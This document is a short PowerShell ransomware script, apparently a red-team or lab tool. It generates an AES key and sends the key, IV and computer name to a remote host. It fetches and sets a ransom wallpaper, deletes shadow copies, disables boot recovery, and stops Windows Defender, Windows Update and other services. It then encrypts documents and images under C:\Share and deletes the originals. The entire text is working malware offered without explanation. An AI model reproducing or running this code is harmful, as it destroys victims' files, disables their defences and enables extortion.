set-strictMode -version 2.0
function Ransom
{

Param(
    [Parameter(Position = 0)]
    [String]
    $IP='127.0.0.1'
    )

    $aesManaged=new-object "System.Security.Cryptography.AesManaged";
    $aesManaged.Mode=[System.Security.Cryptography.CipherMode]::CBC;
    $aesManaged.Padding=[System.Security.Cryptography.PaddingMode]::Zeros;
    $aesManaged.BlockSize=128;
    $aesManaged.KeySize=256;
    $aesManaged.GenerateKey();
    $IV =  [System.Convert]::ToBase64String($aesManaged.IV);
    $key = [System.Convert]::ToBase64String($aesManaged.Key);

    $URL="http://$IP/key=$Key&iv=$IV&pc=$env:computername";
    try { Invoke-WebRequest $URL } catch {
        $_.Exception.Response.StatusCode.Value__}

    $background = "http://$IP/wall.jpg"
    Invoke-WebRequest -Uri $background -OutFile "/users/$env:USERNAME/wall.jpg"
    Start-Sleep -s 2
    $wallpaper = "C:/users/$env:USERNAME/wall.jpg"
    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -value "$wallpaper"
    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -value "10"
    Start-Sleep -s 2
    rundll32.exe user32.dll, UpdatePerUserSystemParameters, 1 , $False

    vssadmin delete shadows /all /quiet;
    spsv vss -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='vss'").StartMode) -ne "Disabled"){
    set-service vss -StartupType Disabled};

    bcdedit /set recoveryenabled No|Out-Null;
    bcdedit /set bootstatuspolicy ignoreallfailures|Out-Null;

    spsv Wscsvc -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='Wscsvc'").StartMode) -ne "Disabled"){
    set-service Wscsvc -StartupType Disabled};
    spsv WinDefend -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='WinDefend'").StartMode) -ne "Disabled"){
    set-service WinDefend -StartupType Disabled};
    spsv Wuauserv -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='Wuauserv'").StartMode) -ne "Disabled"){
    set-service Wuauserv -StartupType Disabled};
    spsv BITS -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='BITS'").StartMode) -ne "Disabled"){
    set-service BITS -StartupType Disabled};
    spsv ERSvc -ErrorAction SilentlyContinue;
    spsv WerSvc -ErrorAction SilentlyContinue;
    if(((gwmi -Query "Select StartMode From Win32_Service Where Name='WerSvc'").StartMode) -ne "Disabled"){
    set-service WerSvc -StartupType Disabled};

    Write-Output "Encryption phase" 

    $encryptor=$aesManaged.CreateEncryptor();
    $directory = "C:\Share"
    $files=gci $directory -Recurse -Include *.txt,*.pdf,*.docx,*.doc,*.jpg;
    foreach($file in $files) {
        $bytes=[System.IO.File]::ReadAllBytes($($file.FullName));
        $encryptedData=$encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
        [byte[]] $fullData=$aesManaged.IV + $encryptedData;
        [System.IO.File]::WriteAllBytes($($file.FullName+".crpt"),$fullData);
        Remove-Item $file;
    }
}
